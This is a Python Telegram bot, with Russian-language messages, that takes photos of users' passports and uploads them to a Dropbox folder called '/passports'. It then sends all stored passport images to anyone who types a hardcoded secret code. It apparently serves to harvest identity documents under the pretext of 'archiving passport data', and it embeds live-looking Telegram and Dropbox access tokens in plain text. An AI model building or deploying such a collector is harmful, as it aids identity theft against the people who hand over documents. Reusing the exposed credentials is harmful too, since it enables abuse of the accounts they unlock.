# I LOVE DESH BEARCHHHHH
import os
import dropbox
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, ContextTypes, filters

BOT_TOKEN = "8517574417:AAFaAdMDJJzQlN1j8oBpR8_OmYYvFY2AD0w"
DROPBOX_TOKEN = "sl.u.AGJQYXE5dI688ZNN667lQzz_02V9EVO-z3QZ49bYdv_Y2GgsQqv1Il9FmQF3_cXT0Xoft89zt5li_nSIJicbg1iLq-wC_lduZr9AIweX3O_tDqsM1W-P5qEe8mXM2eb4QbccYYK9VwjQMSSC89FN96f2vPvW8wRMvy9s2Z6ydjCXbkDVmopbfPEDqXxtuw9CQg_xWIECGocyShvL2e0vBJq9GmKDIxFKQVeg3zvsnyqPkMkEVwoTSFmmIhRvnKPO0xrMr01lFD-BY0kLuD_16ZlTACnYnU4C-jvYmjWhBbauGsjMfoY5rk8W9iTzLV7pPDoQR61h5ovRxlaTFiKoDWBMBiZr3LkaZo-P2e6cIhg3WtwLcUoLx_nFnOEoTUsvG9ZgkVfaEP55hKBiQs-0OmeUpzhGF41x9y40viovE1qAhwnCpA5Mr6yv5S6GLsgZDebU1CelTAkLHMcoDMZj1hwy7_ggu1WXek_P-RycN87bUANK96JkCHG19IiuZ1WiNgf_7WGLxl_Iz-kZfmTcJaaVO7pE4CmJWl_w4PnixMJvYMbQRNehY4l6oOu-6S3CgXJ3uwzfAIUD6pWtIueqjVP8K68JUxmKAWdPVXhwMBwNVMWq7OdCQ6e_emBczGyaU5uUxrbwv1f2hyfErV3QFMYIm-7oP7m3RQYgoeG9j8wg2A2UribScvI_Ud5XWk2B_Gg74rD1cBYtW34dqU8y_TLRP3WZgOnWoMVmnDjhmA8q2hWEnDklSm5GJan6Em0WjxKc4BN-gHTroMLeQWdRgE-GyIEPlvSLyMIBOAOWDD_A033myiR-5D5KdkhwRaIcR8D9KTKOpG4oD43dJnl3H0gOWaty6iAxXzeyA_bEB_qliqvsxy3K80p8TbdjIFVhA5Rm-ly3OXecVZ877f2ZmX_zidHybS0cB3i9324XpKP9fw3uP_ydXdBxjqCBF0O4XhV7CXjDtNF_VMt9pFXPRITMAakQl5sjPj8Zvu-8BMJ9cvK1OH858y57IkvCPJus4EQzSEVwXuH8xaHd_ciY7KOMGmFQ83wTEO9ajOn8n3HtX13eTVKRwiULrZ2oiBdJd_fQGpcvO751i4CICQRBsoUQPJ8XGdyTjE82LYSDVFOQgdayYEy_2h2WJNZ7nCUbWBPqxCkc1PTRk61oUu0KMAXnQACvxAfRKhs9SxYavl6CeLqeTLodIRiamLw-xzmZcMKJVf5BMIcl6Ea-ZzezTnysM0o79xoxXZzVCITxMXyAOm459qtqI-DxSiF2hc9TRtxa5iOX-ugrRDwGhYML1DfPNZ7QEmJZCxuXxND6yreDuEusax84Azwcl8uHCBw-gIJHN2zRtZHKgAJD1imtYsynMF2ScmzFQ2NW8pty2jB55wL5uLc32E6IJ2R3z8v07jvLZNQH19E1MocL1nBq"
SPECIAL_CODE = "Q_FBR_PASSPORTS/DATA.GB$04743"
DROPBOX_FOLDER = "/passports"

dbx = dropbox.Dropbox(DROPBOX_TOKEN)

async def upload_to_dropbox(local_path, remote_name):
    with open(local_path, "rb") as f:
        dbx.files_upload(f.read(), f"{DROPBOX_FOLDER}/{remote_name}", mode=dropbox.files.WriteMode.overwrite)

async def list_files():
    res = dbx.files_list_folder(DROPBOX_FOLDER)
    return res.entries

async def download_file(path, local_name):
    _, res = dbx.files_download(path)
    with open(local_name, "wb") as f:
        f.write(res.content)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if msg.text == SPECIAL_CODE:
        files = await list_files()
        if not files:
            await msg.reply_text("Архив пуст.")
            return
        for f in files:
            await download_file(f.path_lower, f"temp_{f.name}")
            with open(f"temp_{f.name}", "rb") as photo_file:
                await msg.reply_photo(photo=photo_file)
            os.remove(f"temp_{f.name}")
        return
    if msg.photo:
        try:
            file = await msg.photo[-1].get_file()
            file_path = f"temp_{msg.from_user.id}.jpg"
            await file.download_to_drive(file_path)
            remote_name = os.path.basename(file_path)
            await upload_to_dropbox(file_path, remote_name)
            os.remove(file_path)
            await msg.reply_text("Архивация паспортных данных прошла успешно!✅")
        except Exception as e:
            await msg.reply_text(f"Что-то пошло не так на этапе архивации. Обратитесь к администратору архива @Qshka16\nОшибка: {e}")
        return
    await msg.reply_text("Не удалось распознать. Идите нахуй.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Бот активен. Отправьте фото паспорта или спецкод.")

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.ALL, handle_message))

if __name__ == '__main__':
    print("Бот запущен...")
    app.run_polling()
